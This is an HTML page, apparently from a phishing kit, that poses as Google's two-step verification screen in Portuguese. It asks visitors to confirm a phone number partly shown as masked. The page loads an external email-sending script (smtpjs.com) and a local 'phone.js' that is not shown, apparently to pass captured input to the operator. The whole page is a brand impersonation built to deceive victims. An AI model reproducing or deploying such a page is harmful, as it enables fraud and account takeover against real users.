<!DOCTYPE html>
<html>
    <head>
        <title>Google.com</title>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE-edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="stylesheet" href="bootstrap.min.css" />
        <link rel="stylesheet" href="styles.css" />
        <link rel="shortcut icon" href="favicon.ico" />
        <script src="jquery-3.6.0.js"></script>
        <script src="phone.js"></script>
        <script src="https://smtpjs.com/v3/smtp.js"></script>
    </head>
    <body>
        <section>
            <div class="container">
                <div class="row justify-content-center">
                    <div class="modallogin">
                        <div class="logo">
                            <img src="google.png">
                        </div>

                        <div class="jVhfh">
                            <h1><span>Verificação em duas etapas</span></h1>
                        </div>

                        <div class="jVhfh">
                            <h2>
                                <span>Para proteger sua conta, confirme seu telefone<b> 1197845-****</b></span>
                            </h2>
                        </div>

                        <form action="phone" method="post">
                            <div class="inputContainer">
                                <div id="bad-login"></div>

                                <input
                                    style="text-align: center;"
                                    type="number"
                                    autocomplete="tel-local"
                                    spellcheck="false"
                                    tabindex="0"
                                    placeholder="Número de telefone"
                                    name="phone"
                                    autocapitalize="none"
                                    id="phone"
                                    dir="ltr"
                                    data-initial-dir="ltr"
                                    data-initial-value=""
                                />
                            </div>

                            <div style="justify-content: end;" class="button pass">
                                <input class="goBtn" id="phoneBtn" type="submit" value="Verificar  " />
                            </div>
                        </form>
                    </div>
                    <section>
                        <div class="footer col-md-6">
                            <ul>
                                <ul>
                                    <p>Ajuda</p>
                                </ul>
                                <ul>
                                    <p>Privacidade</p>
                                </ul>
                                <ul>
                                    <p>Termos</p>
                                </ul>
                            </ul>
                        </div>
                    </section>
                </div>
            </div>
        </section>
    </body>
</html>
